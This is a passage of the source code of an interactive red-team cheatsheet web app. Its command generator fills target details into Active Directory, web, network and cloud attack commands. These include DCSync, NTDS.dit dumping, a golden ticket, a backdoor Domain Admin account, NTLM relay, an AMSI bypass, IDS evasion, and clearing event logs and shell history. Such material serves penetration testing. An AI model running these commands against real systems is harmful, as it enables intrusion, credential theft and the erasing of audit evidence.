      values: ['Web Application']
    }
  },
  {
    id: 'cloudType',
    question: 'Cloud Provider',
    options: ['AWS', 'Azure', 'Google Cloud'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Cloud']
    }
  },
  {
    id: 'adPhase',
    question: 'Which phase of Active Directory testing are you in?',
    options: ['Initial Access', 'Enumeration', 'Lateral Movement', 'Privilege Escalation', 'Domain Persistence', 'Data Exfiltration'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    }
  },
  {
    id: 'adTools',
    question: 'Do you have these tools available?',
    options: ['Impacket', 'Bloodhound', 'Mimikatz', 'Rubeus', 'PowerView', 'Responder', 'CrackMapExec'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    },
    advanced: true
  },
  {
    id: 'adProtectedUsers',
    question: 'Are user accounts protected by additional controls?',
    options: ['LAPS', 'MFA', 'PAM', 'JIT Access', 'Not Sure'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    },
    advanced: true
  }
];

// Add advanced features to the command generator
const advancedFeatures = [
  {
    id: 'opsec',
    name: 'OPSEC Considerations',
    description: 'Include operational security notes with each command'
  },
  {
    id: 'evasion',
    name: 'Evasion Techniques',
    description: 'Add evasion variants for common detection systems'
  },
  {
    id: 'cleanup',
    name: 'Cleanup Commands',
    description: 'Include cleanup steps to remove artifacts'
  },
  {
    id: 'chaining',
    name: 'Command Chaining',
    description: 'Combine multiple commands for efficiency'
  }
];

const RedTeamCheatsheetWrapper = () => {
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
  const [selectedSubcategory, setSelectedSubcategory] = useState<string | null>(null);
  const [expandedCommands, setExpandedCommands] = useState<Record<string, boolean>>({});
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const [showHelperInfo, setShowHelperInfo] = useState(true);
  const [activeHelp, setActiveHelp] = useState<string | null>(null);
  
  // Command Generator state
  const [showCommandGenerator, setShowCommandGenerator] = useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [generatedCommands, setGeneratedCommands] = useState<GeneratedCommand[]>([]);
  const [commandGenerationComplete, setCommandGenerationComplete] = useState(false);
  const [advancedMode, setAdvancedMode] = useState(false);
  const [selectedAdvancedFeatures, setSelectedAdvancedFeatures] = useState<string[]>([]);

  // Custom Command Builder state
  const [showCustomBuilder, setShowCustomBuilder] = useState(false);
  const [customCommands, setCustomCommands] = useState<GeneratedCommand[]>([]);
  const [currentCustomCommand, setCurrentCustomCommand] = useState<GeneratedCommand>({
    title: '',
    description: '',
    command: '',
    notes: ''
  });

  // Help tips data
  const helpTips = {
    infrastructure: "Infrastructure attacks focus on network reconnaissance, exploitation of services, and privilege escalation on compromised systems.",
    windowsAD: "Active Directory is Microsoft's identity management service that enables administrators to manage permissions and access to network resources.",
    webAttacks: "Web attacks target vulnerabilities in web applications, such as SQL injection, XSS, and file upload vulnerabilities.",
    postExploitation: "Post-exploitation activities occur after initial access is gained, including establishing persistence and extracting credentials.",
    c2Frameworks: "Command and Control (C2) frameworks are used to maintain communications with compromised systems while evading detection.",
    cloud: "Cloud attacks target misconfigurations and vulnerabilities in cloud environments like AWS, Azure, and Google Cloud."
  };

  // Filter commands based on search term
  const filteredCategories = cheatsheetData
    .map(category => {
      const filteredSubcategories = category.subcategories
        .map(subcategory => {
          const filteredCommands = subcategory.commands.filter(
            cmd => 
              cmd.command.toLowerCase().includes(searchTerm.toLowerCase()) ||
              cmd.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
              (cmd.example && cmd.example.toLowerCase().includes(searchTerm.toLowerCase()))
          );
          return {
            ...subcategory,
            commands: filteredCommands
          };
        })
        .filter(subcategory => subcategory.commands.length > 0 || subcategory.name.toLowerCase().includes(searchTerm.toLowerCase()));
      
      return {
        ...category,
        subcategories: filteredSubcategories
      };
    })
    .filter(category => 
      category.subcategories.length > 0 || 
      category.name.toLowerCase().includes(searchTerm.toLowerCase())
    );

  // Generate commands based on answers with advanced options
  const generateCommands = () => {
    let commands: GeneratedCommand[] = [];
    const attackType = answers['attackType'] || '';
    const targetIP = answers['targetIP'] || '';
    const hasCredentials = answers['hasCredentials'] === 'true';
    const username = answers['username'] || '';
    const password = answers['password'] || '';
    const domainName = answers['domainName'] || '';
    const webTarget = answers['webTarget'] || '';
    const cloudType = answers['cloudType'] || '';
    
    const includeOpsec = selectedAdvancedFeatures.includes('opsec');
    const includeEvasion = selectedAdvancedFeatures.includes('evasion');
    const includeCleanup = selectedAdvancedFeatures.includes('cleanup');
    const includeChaining = selectedAdvancedFeatures.includes('chaining');

    // Initial reconnaissance commands for all attack types
    if (targetIP) {
      commands.push({
        title: 'Basic Network Scan',
        description: 'Perform a quick network scan to identify open ports',
        command: `nmap -sV -sC -p- ${targetIP}`,
        notes: 'This will scan all ports and identify services running on the target'
      });
    }

    if (attackType === 'Active Directory') {
      const adPhase = answers['adPhase'] || '';
      const adTools = answers['adTools'] || '';
      const adProtectedUsers = answers['adProtectedUsers'] || '';
      
      // Initial reconnaissance commands (some may already exist)
      if (targetIP) {
        commands.push({
          title: 'Enumerate SMB Shares',
          description: 'List available SMB shares on the target',
          command: `smbclient -L //${targetIP}/ -N`,
          notes: 'Lists SMB shares without authentication (null session)',
          mitreTechnique: 'Network Share Discovery',
          mitreId: 'T1135'
        });
        
        commands.push({
          title: 'Check for Anonymous Access',
          description: 'Test for anonymous access to SMB shares',
          command: `crackmapexec smb ${targetIP} -u '' -p ''`,
          notes: 'Attempts to connect to SMB with null credentials',
          mitreTechnique: 'Network Share Discovery',
          mitreId: 'T1135'
        });
        
        // Add more sophisticated commands for initial recon
        commands.push({
          title: 'LDAP Anonymous Bind',
          description: 'Test for LDAP anonymous bind',
          command: `ldapsearch -x -h ${targetIP} -D '' -w '' -b "DC=${domainName?.split('.').join(',DC=')}"`,
          notes: 'Checks if LDAP server allows anonymous binds',
          mitreTechnique: 'Network Service Scanning',
          mitreId: 'T1046'
        });
        
        commands.push({
          title: 'Detect Domain Controllers',
          description: 'Find domain controllers in the network',
          command: `nmap -p 389,636,3268,3269 --open ${targetIP}/24`,
          notes: 'Scans for LDAP ports that indicate domain controllers',
          mitreTechnique: 'Remote System Discovery',
          mitreId: 'T1018'
        });
      }
      
      // Enhanced commands for domain enumeration
      if (domainName) {
        commands.push({
          title: 'Domain User Enumeration',
          description: 'Attempt to enumerate domain users',
          command: `enum4linux -U ${targetIP}`,
          notes: 'Tries to list domain users via RID cycling',
          mitreTechnique: 'Account Discovery',
          mitreId: 'T1087'
        });
        
        commands.push({
          title: 'Kerberos User Enumeration',
          description: 'Check for Kerberos pre-auth disabled users (AS-REP Roasting)',
          command: `GetNPUsers.py ${domainName}/ -dc-ip ${targetIP} -request -format hashcat -outputfile asreproast.txt`,
          notes: 'May obtain crackable hashes for users with Kerberos pre-auth disabled',
          mitreTechnique: 'Steal or Forge Kerberos Tickets',
          mitreId: 'T1558.004'
        });
        
        // Add new specific commands for finding domain information
        commands.push({
          title: 'Domain Trust Mapping',
          description: 'Map domain trusts to find attack paths',
          command: `Get-DomainTrust.py -u '' -p '' -d ${domainName} -dc-ip ${targetIP}`,
          notes: 'Discovers trust relationships between domains which could be leveraged for lateral movement',
          mitreTechnique: 'Domain Trust Discovery',
          mitreId: 'T1482'
        });
      }
      
      // Enhanced credential-based commands
      if (hasCredentials && username && password) {
        commands.push({
          title: 'Authenticate with Credentials',
          description: 'Test provided credentials against the target',
          command: `crackmapexec smb ${targetIP} -u "${username}" -p "${password}"`,
          notes: 'Checks if credentials are valid',
          mitreTechnique: 'Valid Accounts',
          mitreId: 'T1078'
        });
        
        // Add more advanced enumeration commands with credentials
        if (adTools === 'Bloodhound' || advancedMode) {
          commands.push({
            title: 'Enumerate Domain with BloodHound',
            description: 'Collect Active Directory data for analysis with BloodHound',
            command: `bloodhound-python -d ${domainName} -u "${username}" -p "${password}" -ns ${targetIP} -c All`,
            notes: 'Collects data about users, groups, computers, and permissions for attack path analysis',
            mitreTechnique: 'Domain Trust Discovery',
            mitreId: 'T1482'
          });
        }
        
        commands.push({
          title: 'Enumerate Domain Users',
          description: 'List all domain users with authenticated access',
          command: `GetADUsers.py -all ${domainName}/${username}:"${password}" -dc-ip ${targetIP}`,
          notes: 'Shows detailed information about domain users',
          mitreTechnique: 'Account Discovery',
          mitreId: 'T1087.002'
        });
        
        commands.push({
          title: 'Kerberoasting Attack',
          description: 'Request service tickets for accounts with SPNs',
          command: `GetUserSPNs.py ${domainName}/${username}:"${password}" -dc-ip ${targetIP} -request -outputfile kerberoast.txt`,
          notes: 'Obtains service tickets that can be cracked offline',
          mitreTechnique: 'Steal or Forge Kerberos Tickets',
          mitreId: 'T1558.003'
        });
        
        // Add key phase-specific commands for AD testing
        if (adPhase === 'Lateral Movement' || advancedMode) {
          commands.push({
            title: 'Find Local Admin Access',
            description: 'Identify machines where our user has local admin rights',
            command: `crackmapexec smb ${targetIP}/24 -u "${username}" -p "${password}" --local-auth`,
            notes: 'Scans the network to find computers where the credentials have local admin access',
            mitreTechnique: 'Remote Services',
            mitreId: 'T1021'
          });
          
          commands.push({
            title: 'Find Admin Sessions',
            description: 'Look for logged-in domain admins on network computers',
            command: `crackmapexec smb ${targetIP}/24 -u "${username}" -p "${password}" --sessions`,
            notes: 'Identifies machines where privileged users are logged in for potential session hijacking',
            mitreTechnique: 'Account Discovery',
            mitreId: 'T1087.002'
          });
          
          commands.push({
            title: 'WMI Command Execution',
            description: 'Execute commands remotely via WMI',
            command: `wmiexec.py ${domainName}/${username}:"${password}"@${targetIP} "whoami /all"`,
            notes: 'Uses Windows Management Instrumentation for remote command execution',
            mitreTechnique: 'Windows Management Instrumentation',
            mitreId: 'T1047'
          });
          
          commands.push({
            title: 'PowerShell Remoting',
            description: 'Use PowerShell remoting for command execution',
            command: `crackmapexec winrm ${targetIP} -u "${username}" -p "${password}" -x "whoami /all"`,
            notes: 'Execute PowerShell commands remotely, requires WinRM to be enabled',
            mitreTechnique: 'Remote Services',
            mitreId: 'T1021.006'
          });
        }
        
        if (adPhase === 'Privilege Escalation' || advancedMode) {
          commands.push({
            title: 'Check for Kerberos Delegation',
            description: 'Identify systems with Kerberos Delegation enabled',
            command: `findDelegation.py -dc-ip ${targetIP} ${domainName}/${username}:"${password}"`,
            notes: 'Finds potential privilege escalation paths via constrained or unconstrained delegation',
            mitreTechnique: 'Abuse Elevation Control Mechanism',
            mitreId: 'T1548'
          });
          
          commands.push({
            title: 'Extract Group Policies',
            description: 'Download and analyze Group Policy Objects',
            command: `getPac.py -dc-ip ${targetIP} ${domainName}/${username}:"${password}"`,
            notes: 'Extracts group policies which may contain sensitive information or misconfiguration',
            mitreTechnique: 'Group Policy Discovery',
            mitreId: 'T1615'
          });
          
          if (adTools === 'Mimikatz' || advancedMode) {
            commands.push({
              title: 'DCSync Attack',
              description: 'Extract password hashes from the domain controller',
              command: `secretsdump.py ${domainName}/${username}:"${password}"@${targetIP} -just-dc`,
              notes: 'Performs a DCSync attack to retrieve password hashes of all domain users, requires high privileges',
              mitreTechnique: 'OS Credential Dumping: DCSync',
              mitreId: 'T1003.006'
            });
          }
        }
        
        if (adPhase === 'Domain Persistence' || advancedMode) {
          if (adTools === 'Mimikatz' || advancedMode) {
            commands.push({
              title: 'Golden Ticket Creation',
              description: 'Create a Golden Ticket for persistence',
              command: `mimikatz "kerberos::golden /user:Administrator /domain:${domainName} /sid:S-1-5-21-XXXX /krbtgt:HASH_HERE /id:500 /ptt" exit`,
              notes: 'Creates a Golden Ticket - requires krbtgt hash and SID, replace placeholders with actual values',
              mitreTechnique: 'Steal or Forge Kerberos Tickets: Golden Ticket',
              mitreId: 'T1558.001'
            });
          }
          
          commands.push({
            title: 'Add Backdoor User',
            description: 'Create a backdoor domain user account',
            command: `net user backdooruser Password123! /add /domain && net group "Domain Admins" backdooruser /add /domain`,
            notes: 'Creates a new domain admin account. WARNING: Very detectable, use only with authorization',
            mitreTechnique: 'Account Creation',
            mitreId: 'T1136.002'
          });
          
          if (adProtectedUsers === 'LAPS' || advancedMode) {
            commands.push({
              title: 'LAPS Password Extraction',
              description: 'Extract LAPS passwords if accessible',
              command: `crackmapexec ldap ${targetIP} -u "${username}" -p "${password}" -M laps`,
              notes: 'Extracts Local Administrator Password Solution (LAPS) managed passwords if the user has read access',
              mitreTechnique: 'Credentials from Password Stores',
              mitreId: 'T1555'
            });
          }
        }
        
        if (adPhase === 'Data Exfiltration' || advancedMode) {
          commands.push({
            title: 'Extract NTDS.dit',
            description: 'Extract the Active Directory database remotely',
            command: `crackmapexec smb ${targetIP} -u "${username}" -p "${password}" --ntds`,
            notes: 'Extracts the NTDS.dit file containing all domain password hashes, requires Domain Admin privileges',
            mitreTechnique: 'OS Credential Dumping: NTDS',
            mitreId: 'T1003.003'
          });
          
          commands.push({
            title: 'Find Sensitive Files',
            description: 'Search for sensitive files across the domain',
            command: `findDomainShare.py ${domainName}/${username}:"${password}"@${targetIP} -pattern "password|confidential|secret" -share "SYSVOL,NETLOGON"`,
            notes: 'Searches for sensitive files in domain shares, customize the pattern based on target',
            mitreTechnique: 'Data from Network Shared Drive',
            mitreId: 'T1039'
          });
        }
      }
      
      // Add specific commands for certain tools
      if (adTools === 'Responder' || advancedMode) {
        commands.push({
          title: 'LLMNR/NBT-NS Poisoning',
          description: 'Capture NetNTLM hashes using Responder',
          command: `responder -I eth0 -wfv`,
          notes: 'Intercepts name resolution broadcasts to capture authentication attempts, good for initial access',
          mitreTechnique: 'LLMNR/NBT-NS Poisoning and SMB Relay',
          mitreId: 'T1557.001'
        });
        
        if (advancedMode) {
          commands.push({
            title: 'NTLM Relay Attack',
            description: 'Relay captured credentials to authenticate to other systems',
            command: `ntlmrelayx.py -t ${targetIP} -smb2support`,
            notes: 'Relays captured credentials to target systems. Run alongside Responder (with SMB and HTTP disabled)',
            mitreTechnique: 'LLMNR/NBT-NS Poisoning and SMB Relay',
            mitreId: 'T1557.001'
          });
        }
      }
    } 
    else if (attackType === 'Web Application') {
      // Add Web-specific commands
      if (webTarget) {
        commands.push({
          title: 'Basic Web Reconnaissance',
          description: 'Identify web technologies',
          command: `whatweb ${webTarget}`,
          notes: 'Identifies web frameworks, content management systems, and server details'
        });
        
        commands.push({
          title: 'Directory Discovery',
          description: 'Find hidden directories and files',
          command: `gobuster dir -u ${webTarget} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`,
          notes: 'Discovers potentially accessible directories and files'
        });
        
        commands.push({
          title: 'Web Vulnerability Scan',
          description: 'Check for common web vulnerabilities',
          command: `nikto -h ${webTarget}`,
          notes: 'Identifies security issues, misconfigurations, and outdated software'
        });
        
        commands.push({
          title: 'SQL Injection Test',
          description: 'Test for SQL injection vulnerabilities',
          command: `sqlmap -u "${webTarget}" --forms --batch`,
          notes: 'Automatically detects and exploits SQL injection in web forms'
        });
      }
    }
    else if (attackType === 'Network Infrastructure') {
      // Add Network-specific commands
      if (targetIP) {
        commands.push({
          title: 'Network Sweep',
          description: 'Discover live hosts in the network',
          command: `nmap -sn ${targetIP}/24`,
          notes: 'Performs a ping scan to identify active hosts'
        });
        
        commands.push({
          title: 'Vulnerability Scan',
          description: 'Check for known vulnerabilities',
          command: `nmap --script vuln ${targetIP}`,
          notes: 'Scans for common vulnerabilities using Nmap scripts'
        });
      }
      
      if (hasCredentials && username && password) {
        commands.push({
          title: 'SSH Access',
          description: 'Attempt to access via SSH',
          command: `ssh ${username}@${targetIP}`,
          notes: 'Tries to establish an SSH connection with provided credentials'
        });
      }
    }
    else if (attackType === 'Cloud') {
      // Add Cloud-specific commands
      if (cloudType === 'AWS') {
        commands.push({
          title: 'Configure AWS CLI',
          description: 'Set up AWS credentials',
          command: 'aws configure',
          notes: 'You will be prompted to enter access key, secret key, region, and output format'
        });
        
        commands.push({
          title: 'List S3 Buckets',
          description: 'Enumerate all accessible S3 buckets',
          command: 'aws s3 ls',
          notes: 'Shows all S3 buckets the configured credentials can access'
        });
        
        commands.push({
          title: 'Check Identity',
          description: 'Verify current identity and permissions',
          command: 'aws sts get-caller-identity',
          notes: 'Shows account ID, user ID, and ARN of the current credentials'
        });
      } 
      else if (cloudType === 'Azure') {
        commands.push({
          title: 'Azure CLI Login',
          description: 'Authenticate to Azure',
          command: 'az login',
          notes: 'Starts interactive login process for Azure'
        });
        
        commands.push({
          title: 'List Subscriptions',
          description: 'Enumerate accessible subscriptions',
          command: 'az account list',
          notes: 'Shows all subscriptions the authenticated user can access'
        });
        
        commands.push({
          title: 'List Resource Groups',
          description: 'Enumerate resource groups',
          command: 'az group list',
          notes: 'Lists all resource groups in the current subscription'
        });
      }
      else if (cloudType === 'Google Cloud') {
        commands.push({
          title: 'GCloud Auth',
          description: 'Authenticate to Google Cloud',
          command: 'gcloud auth login',
          notes: 'Starts interactive login process for Google Cloud'
        });
        
        commands.push({
          title: 'List Projects',
          description: 'Enumerate accessible projects',
          command: 'gcloud projects list',
          notes: 'Shows all projects the authenticated user can access'
        });
      }
    }

    // Add advanced variants if in advanced mode
    if (advancedMode) {
      if (attackType === 'Active Directory') {
        // Add advanced AD commands
        if (targetIP && hasCredentials && username && password) {
          commands.push({
            title: 'DCSync Attack (Advanced)',
            description: 'Extract password hashes from the domain controller',
            command: `secretsdump.py ${domainName}/${username}:"${password}"@${targetIP} -just-dc-ntlm`,
            notes: includeOpsec ? 'OPSEC: This creates a lot of replication traffic and may be logged as directory service access' : undefined
          });
          
          commands.push({
            title: 'LAPS Password Extraction',
            description: 'Extract LAPS passwords if accessible',
            command: `Get-LAPSPasswords.py -u "${username}" -p "${password}" -d ${domainName} -l ${targetIP}`,
            notes: includeOpsec ? 'OPSEC: Queries for ms-Mcs-AdmPwd attribute which may be monitored' : undefined
          });
          
          if (includeEvasion) {
            commands.push({
              title: 'AMSI Bypass for PowerShell',
              description: 'Bypass AMSI to run blocked PowerShell scripts',
              command: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
              notes: 'This bypasses AMSI to allow running PowerShell scripts that might be blocked'
            });
          }
        }
      }
      
      if (attackType === 'Network Infrastructure' && targetIP) {
        commands.push({
          title: 'Responder (Advanced)',
          description: 'Capture NTLM hashes using Responder with advanced options',
          command: `responder -I eth0 -rwPv`,
          notes: includeOpsec ? 'OPSEC: Very noisy, creates multiple poisoned responses on the network' : undefined
        });
        
        if (includeEvasion) {
          commands.push({
            title: 'Firewall Evasion Scan',
            description: 'Scan using techniques to evade firewall detection',
            command: `nmap -sS -T2 --data-length 15 --max-retries 0 --randomize-hosts ${targetIP}`,
            notes: 'Uses slower timing, random packet length and host order to avoid triggering IDS/IPS'
          });
        }
      }
      
      // Add cleanup commands if requested
      if (includeCleanup) {
        commands.push({
          title: 'Clean Event Logs (Windows)',
          description: 'Clear Windows event logs to remove evidence',
          command: `wevtutil cl System && wevtutil cl Security && wevtutil cl Application`,
          notes: 'WARNING: Log clearing itself may be logged or monitored in secure environments'
        });
        
        commands.push({
          title: 'Remove Command History (Linux)',
          description: 'Clear bash history and disable logging',
          command: `history -c && rm ~/.bash_history && ln -sf /dev/null ~/.bash_history && export HISTSIZE=0`,
          notes: 'Clears current history, removes history file, and prevents new history from being written'
        });
      }
    }

    // Add MITRE ATT&CK references to commands if in advanced mode
    if (advancedMode) {
      // Example for Active Directory commands
      if (attackType === 'Active Directory') {
        // Update Kerberoasting command with MITRE reference
        const kerberoastIndex = commands.findIndex(cmd => cmd.title.includes('Kerberoasting'));
        if (kerberoastIndex !== -1) {
          commands[kerberoastIndex].mitreTechnique = 'Steal or Forge Kerberos Tickets';
          commands[kerberoastIndex].mitreId = 'T1558';
        }
        
        // Update BloodHound command with MITRE reference
        const bloodhoundIndex = commands.findIndex(cmd => cmd.title.includes('BloodHound'));
        if (bloodhoundIndex !== -1) {
          commands[bloodhoundIndex].mitreTechnique = 'Domain Trust Discovery';
          commands[bloodhoundIndex].mitreId = 'T1482';
        }
        
        // Add DCSync MITRE reference
        const dcsyncIndex = commands.findIndex(cmd => cmd.title.includes('DCSync'));
        if (dcsyncIndex !== -1) {
          commands[dcsyncIndex].mitreTechnique = 'DCSync';
          commands[dcsyncIndex].mitreId = 'T1003.006';
        }
      }
      
      // Example for Web Application commands
      if (attackType === 'Web Application') {
        const sqlmapIndex = commands.findIndex(cmd => cmd.title.includes('SQL Injection'));
        if (sqlmapIndex !== -1) {
          commands[sqlmapIndex].mitreTechnique = 'Exploit Public-Facing Application';
          commands[sqlmapIndex].mitreId = 'T1190';
        }
      }
    }

    setGeneratedCommands(commands);
    setCommandGenerationComplete(true);
  };

  // Handle question answer
  const handleAnswer = (questionId: string, value: string) => {
    setAnswers(prev => ({ ...prev, [questionId]: value }));
  };

  // Get next visible question
  const getNextVisibleQuestionIndex = (startIndex: number) => {
    for (let i = startIndex + 1; i < commandGeneratorQuestions.length; i++) {
      const question = commandGeneratorQuestions[i];
      if (!question.dependsOn) {
        return i;
      }
      
      const dependsOn = question.dependsOn;
      const dependencyValue = answers[dependsOn.questionId];
      
      if (dependsOn.values.includes(dependencyValue)) {
        return i;
      }
    }
    return -1; // No more questions
  };

  // Go to next question
  const goToNextQuestion = () => {
    const nextIndex = getNextVisibleQuestionIndex(currentQuestionIndex);
    
    if (nextIndex === -1) {
      // No more questions, generate commands
      generateCommands();
    } else {
      setCurrentQuestionIndex(nextIndex);
    }
  };

  // Reset command generator
  const resetCommandGenerator = () => {
    setCurrentQuestionIndex(0);
    setAnswers({});
    setGeneratedCommands([]);
    setCommandGenerationComplete(false);
  };

  // Check if current question should be shown
  const shouldShowQuestion = (question: CommandGeneratorQuestion) => {
    if (!question.dependsOn) {
      return true;
    }
    
    const dependsOn = question.dependsOn;
    const dependencyValue = answers[dependsOn.questionId];
    
    return dependsOn.values.includes(dependencyValue);
  };

  // Function to download generated commands as a bash script
  const downloadAsScript = () => {
    let scriptContent = "#!/bin/bash\n\n";
    scriptContent += "# Red Team Command Script\n";
    scriptContent += "# Generated on: " + new Date().toLocaleString() + "\n\n";
    
    generatedCommands.forEach((cmd, index) => {
      scriptContent += `echo "Step ${index + 1}: ${cmd.title}"\n`;
      scriptContent += `echo "${cmd.description}"\n`;
      scriptContent += `# ${cmd.notes}\n`;
      scriptContent += `${cmd.command}\n\n`;
      scriptContent += `echo "Press Enter to continue..."\n`;
      scriptContent += `read\n\n`;
    });
    
    const blob = new Blob([scriptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'red_team_commands.sh';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Add function to download as professional formats
  const downloadAsProfessional = (format: 'json' | 'csv' | 'yaml' | 'markdown') => {
    let content = '';
    
    switch (format) {
      case 'json':
        content = JSON.stringify({
          createdAt: new Date().toISOString(),
          scenario: {
            attackType: answers['attackType'],
            target: answers['targetIP'] || answers['webTarget'],
            domain: answers['domainName'],
          },
          commands: generatedCommands.map(cmd => ({
            ...cmd,
            id: Math.random().toString(36).substring(2, 9)
          }))
        }, null, 2);
        break;
        
      case 'csv':
        content = 'Title,Description,Command,MITRE ID,MITRE Technique\n';
        generatedCommands.forEach(cmd => {
          content += `"${cmd.title}","${cmd.description}","${cmd.command}","${cmd.mitreId || ''}","${cmd.mitreTechnique || ''}"\n`;
        });
        break;
        
      case 'yaml':
        content = `---\ncreatedAt: ${new Date().toISOString()}\n`;
        content += `scenario:\n  attackType: ${answers['attackType']}\n`;
        content += `  target: ${answers['targetIP'] || answers['webTarget'] || ''}\n`;
        content += `  domain: ${answers['domainName'] || ''}\n`;
        content += 'commands:\n';
        generatedCommands.forEach(cmd => {
          content += `  - title: ${cmd.title}\n`;
          content += `    description: ${cmd.description}\n`;
          content += `    command: ${cmd.command}\n`;
          if (cmd.mitreTechnique) content += `    mitreTechnique: ${cmd.mitreTechnique}\n`;
          if (cmd.mitreId) content += `    mitreId: ${cmd.mitreId}\n`;
          if (cmd.notes) content += `    notes: ${cmd.notes}\n`;
          content += '\n';
        });
        break;
        
      case 'markdown':
        content = `# Red Team Commands - ${answers['attackType']}\n\n`;
        content += `Generated: ${new Date().toLocaleString()}\n\n`;
        content += `Target: ${answers['targetIP'] || answers['webTarget'] || 'Not specified'}\n`;
        if (answers['domainName']) content += `Domain: ${answers['domainName']}\n`;
        content += '\n## Commands\n\n';
        
        generatedCommands.forEach((cmd, i) => {
          content += `### ${i+1}. ${cmd.title}\n\n`;
          content += `${cmd.description}\n\n`;
          content += '```bash\n';
          content += `${cmd.command}\n`;
          content += '```\n\n';
          
          if (cmd.mitreId) {
            content += `**MITRE ATT&CK**: [${cmd.mitreTechnique} (${cmd.mitreId})](https://attack.mitre.org/techniques/${cmd.mitreId.replace('.', '/')})\n\n`;
          }
          
          if (cmd.notes) content += `**Notes**: ${cmd.notes}\n\n`;
          content += '---\n\n';
        });
        break;
    }
    
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `red_team_commands.${format}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Handle category selection
  const handleCategoryClick = (categoryName: string) => {
    if (selectedCategory === categoryName) {
      setSelectedCategory(null);
      setSelectedSubcategory(null);
    } else {
      setSelectedCategory(categoryName);
      setSelectedSubcategory(null);
      
      // Set helper info based on selected category
      const categoryKey = categoryName.toLowerCase().replace(/\s+/g, '');
      setActiveHelp(categoryKey);
    }
  };

  // Handle subcategory selection
  const handleSubcategoryClick = (subcategoryName: string) => {
    if (selectedSubcategory === subcategoryName) {
      setSelectedSubcategory(null);
    } else {
      setSelectedSubcategory(subcategoryName);
    }
  };

  // Handle command expansion
  const toggleCommandExpanded = (commandId: string) => {
    setExpandedCommands(prev => ({
      ...prev,
      [commandId]: !prev[commandId]
    }));
  };

  // Copy command to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCommand(text);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  // Toggle advanced feature selection
  const toggleAdvancedFeature = (featureId: string) => {
    setSelectedAdvancedFeatures(prev => {
      if (prev.includes(featureId)) {
        return prev.filter(id => id !== featureId);
      } else {
        return [...prev, featureId];
      }
    });
  };

  // Add custom command to list
  const addCustomCommand = () => {
    if (currentCustomCommand.title && currentCustomCommand.command) {
      setCustomCommands(prev => [...prev, {...currentCustomCommand}]);
      setCurrentCustomCommand({
        title: '',
        description: '',
        command: '',
        notes: ''
      });
    }
  };

  // Remove custom command from list
  const removeCustomCommand = (index: number) => {
    setCustomCommands(prev => prev.filter((_, i) => i !== index));
  };

  // Add custom commands to generated commands
  const addCustomCommandsToGenerated = () => {
    setGeneratedCommands(prev => [...prev, ...customCommands]);
    setShowCustomBuilder(false);
  };

  return (
    <div className="relative min-h-screen w-full flex flex-col items-center justify-center bg-black overflow-hidden text-white">
      <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center [mask-image:linear-gradient(to_bottom,transparent,black)] opacity-20"></div>
      <div className="container mx-auto px-4 py-8 relative z-10">
        
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center mb-10"
        >
          <h1 className="text-4xl md:text-5xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-500 to-purple-600">
            Red Team Cheatsheet
          </h1>
          <p className="mt-4 text-zinc-400 max-w-2xl mx-auto">
            Interactive cheatsheet with categorized commands and techniques for penetration testing, ethical hacking, and security assessments.
          </p>
          
          <div className="flex flex-wrap gap-3 justify-center mt-4">
            {/* Helper toggle button */}
            <button 
              onClick={() => setShowHelperInfo(!showHelperInfo)}
              className="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 rounded-md text-sm flex items-center gap-2"
            >
              {showHelperInfo ? (
                <>
                  <ExternalLink size={14} />
                  Hide guidance
                </>
              ) : (
                <>
                  <ExternalLink size={14} />
                  Show guidance
                </>
              )}
            </button>
            
            {/* Command Generator toggle button */}
            <button 
              onClick={() => {
                setShowCommandGenerator(!showCommandGenerator);
                if (!showCommandGenerator) {
                  resetCommandGenerator();
                }
              }}
              className="px-3 py-1 bg-blue-700/30 hover:bg-blue-700/50 border border-blue-600/30 rounded-md text-sm flex items-center gap-2"
            >
              <Terminal size={14} />
              {showCommandGenerator ? 'Close' : 'Command Generator'}
            </button>
          </div>
        </motion.div>
        
        {/* Command Generator */}
        {showCommandGenerator && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="mb-8 p-6 bg-zinc-900/70 border border-zinc-800/80 rounded-lg shadow-xl max-w-3xl mx-auto"
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
                  <Terminal className="w-5 h-5" />
                </div>
                <h2 className="text-xl font-bold">Red Team Command Generator</h2>
              </div>
              
              {/* Advanced Mode Toggle */}
              <div className="flex items-center gap-2">
                <span className="text-sm text-zinc-400">Advanced Mode</span>
                <button 
                  onClick={() => setAdvancedMode(!advancedMode)}
                  className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                    advancedMode ? 'bg-blue-600' : 'bg-zinc-700'
                  }`}
                >
                  <span
                    className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
